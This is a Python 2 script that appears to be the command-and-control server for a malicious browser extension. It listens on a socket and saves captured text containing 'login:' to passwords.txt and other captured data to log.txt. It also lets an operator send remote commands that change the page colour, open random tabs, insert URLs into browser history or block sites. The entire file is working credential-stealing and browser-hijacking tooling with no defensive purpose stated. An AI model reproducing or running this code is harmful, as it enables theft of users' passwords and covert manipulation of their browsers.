import socket 
import sys, threading

port = 8001
backlog = 5 
size = 1024 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('localhost',port)) 
print 'Socket has been bound'
s.listen(backlog) 
print 'Socket is listening'

resp = []
resp_lock = threading.Lock()

def clientThread(s):
    while 1:
        client, address = s.accept() 
        while 1:
            data = client.recv(size)
            ind = data.find("Content-Type:")
            endind = data.find("Accept:") 
            if data: 
                if ind > -1:
                    coredata = data[ind + len('Content-Type:'):endind]
                    if coredata.find("login:") != -1:
                        passFile = open("passwords.txt", "a")
                        passFile.write(coredata)
                        passFile.close()
                    else:
                        logFile = open("log.txt", "a")
                        logFile.write(coredata)
                        logFile.close()
                    #print data[ind + len('Content-Type:'):endind]
                else:
                    print 'Recieved ' + data
                resp_lock.acquire()
                if (len(resp) > 0):
                    print 'Sending ' + resp[0]
                    client.send(resp.pop(0)) 
                client.close()
                resp_lock.release()
                break

def getOption():
    tempresp = ''
    while 1:
        if tempresp == '':
            option = str(raw_input('Enter \n1 to change background color\n2 to open random tabs\n3 to add page to history\n4 to block website\n'))
            tempresp = option.lower()
            if tempresp == str(1):
                color = str(raw_input('Enter color(red/blue/green/yellow): '))
                tempresp = color
            elif tempresp == str(2):
                tempresp = "2"
            elif tempresp == str(3):
                site = str(raw_input("Enter url to add to history: "))
                tempresp = "history:" + "http://www." + str(site)
            elif tempresp == str(4):
                site = str(raw_input("Enter url to block: "))
                tempresp = "block:" + str(site)
        else:
            resp_lock.acquire()
            resp.append(tempresp)
            tempresp = ''
            resp_lock.release()

t1 = threading.Thread(target=clientThread ,args=(s,))
t2 = threading.Thread(target=getOption, args=())
t1.start()
t2.start()
t1.join()
t2.join()